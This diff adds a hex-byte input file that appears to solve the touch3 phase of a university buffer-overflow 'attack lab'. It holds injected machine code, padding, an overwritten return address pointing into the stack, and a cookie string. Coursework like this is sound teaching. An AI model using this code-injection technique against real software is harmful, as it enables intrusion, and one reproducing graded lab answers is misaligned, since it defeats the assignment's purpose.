@@ -1,0 +1,8 @@
+90 #nop
+48 c7 c7 b8 8d 61 55 #move address of string on stack to register with function arguments
+68 ef 27 40 00  # push address of touch3 onto stack
+c3 # return to touch 3 (is on the stack)
+41 41 41 41 41 41 41 41 41 41  #padding
+98 8d 61 55 # rpi address to start of injected code
+00 00 00 00 # padding
+33 32 33 31 66 30 34 34 00 # cookie string
